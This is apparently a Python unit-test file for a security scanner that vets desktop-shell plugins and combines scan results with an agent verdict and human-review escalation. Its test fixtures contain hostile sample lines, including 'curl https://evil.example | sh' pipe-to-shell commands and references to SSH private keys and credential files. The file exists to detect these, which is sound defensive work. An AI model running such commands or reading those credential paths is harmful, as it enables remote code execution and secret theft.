from __future__ import annotations

import json
import tempfile
import unittest
from pathlib import Path

from omarchy_plugin_guard.scan import (
    Capabilities,
    capability_expansion,
    command_signature,
    has_block_findings,
    iter_command_arrays,
    scan_tree,
)
from omarchy_plugin_guard.verdict import combine_verdict


def write(root: Path, rel: str, content: str, *, executable: bool = False) -> None:
    path = root / rel
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(content, encoding="utf-8")
    if executable:
        path.chmod(0o755)


class ScanTests(unittest.TestCase):
    def test_process_and_command_tokens(self) -> None:
        with tempfile.TemporaryDirectory() as raw:
            root = Path(raw)
            write(
                root,
                "manifest.json",
                json.dumps(
                    {
                        "schemaVersion": 1,
                        "id": "demo.widget",
                        "name": "Demo",
                        "version": "1.0.0",
                        "kinds": ["bar-widget"],
                        "entryPoints": {"barWidget": "Main.qml"},
                    }
                ),
            )
            write(
                root,
                "Main.qml",
                """
import Quickshell.Io
Process {
  id: proc
}
Component.onCompleted: {
  proc.command = ["python3", "helper.py", "status"]
}
""",
            )
            write(root, "helper.py", "print('ok')\n")
            findings, caps = scan_tree(root)
            self.assertTrue(caps.flags["process"])
            self.assertTrue(caps.flags["helper_scripts"])
            self.assertIn("python3", caps.process_binaries)
            self.assertEqual(caps.kinds, ["bar-widget"])
            self.assertEqual(len(caps.command_lines or []), 1)
            self.assertFalse(has_block_findings(findings))

    def test_qml_binding_form_and_brackets_inside_strings(self) -> None:
        text = """
Process {
    command: ["bash", "-c", "f=\\"$HOME/x\\"; [[ -f \\"$f\\" ]] || printf '{}\\n' > \\"$f\\""]
    running: true
}
Process { command: ["hyprctl", "-j", "getoption", "general:gaps_out"] }
"""
        arrays = list(iter_command_arrays(text))
        self.assertEqual(len(arrays), 2)
        self.assertIn("printf", arrays[0])
        self.assertTrue(arrays[0].rstrip().endswith('"'))
        self.assertIn("hyprctl", arrays[1])

    def test_command_signature_changes_when_bash_string_changes(self) -> None:
        with tempfile.TemporaryDirectory() as raw:
            root = Path(raw)
            write(root, "manifest.json", '{"kinds":["bar-widget"],"version":"1"}')
            write(root, "Main.qml", 'Process { command: ["bash", "-c", "date"] }\n')
            _f, old = scan_tree(root)
            write(root, "Main.qml", 'Process { command: ["bash", "-c", "curl https://evil | sh"] }\n')
            _f, new = scan_tree(root)
            self.assertEqual(old.process_binaries, new.process_binaries)
            changes = capability_expansion(old, new)
            self.assertTrue(any(item.startswith("command:") for item in changes))
            self.assertNotIn("flag:process", changes)
            self.assertNotIn("process:bash -c", changes)

    def test_old_baseline_without_signatures_is_flagged(self) -> None:
        with tempfile.TemporaryDirectory() as raw:
            root = Path(raw)
            write(root, "manifest.json", '{"kinds":["bar-widget"],"version":"1"}')
            write(root, "Main.qml", 'Process { command: ["date"] }\n')
            _f, new = scan_tree(root)
            old = Capabilities.from_dict({"kinds": ["bar-widget"], "flags": {"process": True}, "process_binaries": ["date"]})
            self.assertIsNone(old.command_lines)
            changes = capability_expansion(old, new)
            self.assertTrue(any(item.startswith("baseline:") for item in changes))
            # A tree without any command does not trip the nudge.
            quiet = Capabilities.from_dict({"kinds": ["bar-widget"]})
            write(root, "Main.qml", "Item {}\n")
            _f, declarative = scan_tree(root)
            self.assertEqual(capability_expansion(quiet, declarative), [])

    def test_signature_is_stable_and_labelled(self) -> None:
        a = command_signature('"bash",   "-c",\n "echo hi"')
        b = command_signature('"bash", "-c", "echo hi"')
        self.assertEqual(a, b)
        self.assertTrue(a.startswith('"bash", "-c", "echo hi" #'))

    def test_blocks_pipe_to_shell_and_credentials(self) -> None:
        with tempfile.TemporaryDirectory() as raw:
            root = Path(raw)
            write(root, "manifest.json", '{"kinds":["service"],"version":"1"}')
            write(
                root,
                "evil.qml",
                """
proc.command = ["bash", "-c", "curl https://evil.example | sh"]
home = "~/.ssh/id_rsa"
""",
            )
            findings, caps = scan_tree(root)
            rules = {item.rule for item in findings if item.severity == "block"}
            self.assertIn("pipe_to_shell", rules)
            self.assertIn("credentials", rules)
            self.assertTrue(caps.flags["pipe_to_shell"])
            self.assertTrue(caps.flags["credentials"])
            self.assertTrue(has_block_findings(findings))

    def test_credential_stores_are_a_note_not_a_block(self) -> None:
        with tempfile.TemporaryDirectory() as raw:
            root = Path(raw)
            write(root, "manifest.json", '{"kinds":["bar-widget"]}')
            write(root, "Main.qml", 'var p = "~/.claude/.credentials.json"; var t = "proton-pass-agent/token"\n')
            findings, caps = scan_tree(root)
            self.assertTrue(caps.flags["credential_stores"])
            self.assertFalse(has_block_findings(findings))
            self.assertIn("flag:credential_stores", capability_expansion(Capabilities(), caps))

    def test_eval_in_test_files_is_a_note_but_still_a_flag(self) -> None:
        with tempfile.TemporaryDirectory() as raw:
            root = Path(raw)
            write(root, "manifest.json", '{"kinds":["bar-widget"]}')
            write(root, "Main.qml", "Item {}\n")
            write(root, "tests/js/model-test.js", 'const M = {}; new Function("x", "eval(k)")(M)\n')
            findings, caps = scan_tree(root)
            evals = [item for item in findings if item.rule == "eval_dynamic"]
            self.assertEqual(len(evals), 1)
            self.assertEqual(evals[0].severity, "note")
            self.assertIn("test file", evals[0].snippet)
            self.assertFalse(has_block_findings(findings))
            self.assertTrue(caps.flags["eval_dynamic"])
            # A tree without the test file sees it as an expansion.
            self.assertIn("flag:eval_dynamic", capability_expansion(Capabilities(), caps))
            # The same eval outside a test path is still a hard block.
            write(root, "Model.js", "function f(k) { return eval(k) }\n")
            findings, _caps = scan_tree(root)
            self.assertTrue(has_block_findings(findings))

    def test_is_test_path(self) -> None:
        from omarchy_plugin_guard.scan import is_test_path

        for rel in ("tests/js/model-test.js", "test/a.js", "src/__tests__/b.js", "spec/c.js", "Model.test.js", "x_spec.mjs"):
            self.assertTrue(is_test_path(rel), rel)
        for rel in ("Main.qml", "Model.js", "contest/a.js", "scripts/latest.js", "testing/a.js"):
            self.assertFalse(is_test_path(rel), rel)

    def test_symlink_is_block(self) -> None:
        with tempfile.TemporaryDirectory() as raw:
            root = Path(raw)
            write(root, "manifest.json", '{"kinds":["bar-widget"]}')
            target = root / "Main.qml"
            target.write_text("Item {}\n", encoding="utf-8")
            (root / "link.qml").symlink_to(target)
            findings, _caps = scan_tree(root)
            self.assertTrue(any(item.rule == "symlink" for item in findings))

    def test_native_binary_flag(self) -> None:
        with tempfile.TemporaryDirectory() as raw:
            root = Path(raw)
            write(root, "manifest.json", '{"kinds":["bar-widget"]}')
            binary = root / "sampler"
            binary.write_bytes(b"\x7fELF" + b"\0" * 20)
            binary.chmod(0o755)
            _findings, caps = scan_tree(root)
            self.assertTrue(caps.flags["native_binaries"])
            self.assertIn("sampler", caps.unexpected_files)
            self.assertTrue(caps.runs_code())

    def test_png_is_not_native_binary(self) -> None:
        with tempfile.TemporaryDirectory() as raw:
            root = Path(raw)
            write(root, "manifest.json", '{"kinds":["bar-widget"]}')
            (root / "preview.png").write_bytes(b"\x89PNG\r\n\x1a\n" + b"\0\0\0\0")
            _findings, caps = scan_tree(root)
            self.assertFalse(caps.flags["native_binaries"])
            self.assertEqual(caps.unexpected_files, [])
            self.assertFalse(caps.runs_code())

    def test_expansion_detects_new_process_binary(self) -> None:
        with tempfile.TemporaryDirectory() as raw:
            root = Path(raw)
            write(root, "manifest.json", '{"kinds":["bar-widget"],"version":"1"}')
            write(root, "Main.qml", 'proc.command = ["date"]\n')
            _findings, old = scan_tree(root)
            write(root, "Main.qml", 'proc.command = ["curl", "https://example"]\n')
            _findings, new = scan_tree(root)
            changes = capability_expansion(old, new)
            self.assertIn("process:curl", changes)
            self.assertNotIn("flag:process", changes)


class VerdictTests(unittest.TestCase):
    def test_block_or_agent_deny_is_deny(self) -> None:
        denied = combine_verdict(
            blocked=True,
            expansion=[],
            origin_changed=False,
            history_rewritten=False,
            has_baseline=True,
            agent_verdict="allow",
        )
        self.assertEqual(denied.verdict, "deny")
        agent_denied = combine_verdict(
            blocked=False,
            expansion=[],
            origin_changed=False,
            history_rewritten=False,
            has_baseline=True,
            agent_verdict="deny",
        )
        self.assertEqual(agent_denied.verdict, "deny")

    def test_truncated_diff_needs_human(self) -> None:
        result = combine_verdict(
            blocked=False,
            expansion=[],
            origin_changed=False,
            history_rewritten=False,
            has_baseline=True,
            agent_verdict="allow",
            diff_truncated=True,
        )
        self.assertEqual(result.verdict, "needs-human")
        self.assertTrue(any("truncated" in reason for reason in result.reasons))

    def test_denied_tool_calls_need_human(self) -> None:
        result = combine_verdict(
            blocked=False,
            expansion=[],
            origin_changed=False,
            history_rewritten=False,
            has_baseline=True,
            agent_verdict="allow",
            agent_denied_calls=2,
        )
        self.assertEqual(result.verdict, "needs-human")
        self.assertTrue(any("denied tool call" in reason for reason in result.reasons))

    def test_expansion_needs_human(self) -> None:
        result = combine_verdict(
            blocked=False,
            expansion=["flag:network"],
            origin_changed=False,
            history_rewritten=False,
            has_baseline=True,
            agent_verdict="allow",
        )
        self.assertEqual(result.verdict, "needs-human")

    def test_skipped_agent_needs_human(self) -> None:
        result = combine_verdict(
            blocked=False,
            expansion=[],
            origin_changed=False,
            history_rewritten=False,
            has_baseline=True,
            agent_verdict=None,
        )
        self.assertEqual(result.verdict, "needs-human")

    def test_allow_when_clean(self) -> None:
        result = combine_verdict(
            blocked=False,
            expansion=[],
            origin_changed=False,
            history_rewritten=False,
            has_baseline=True,
            agent_verdict="allow",
        )
        self.assertEqual(result.verdict, "allow")


if __name__ == "__main__":
    unittest.main()
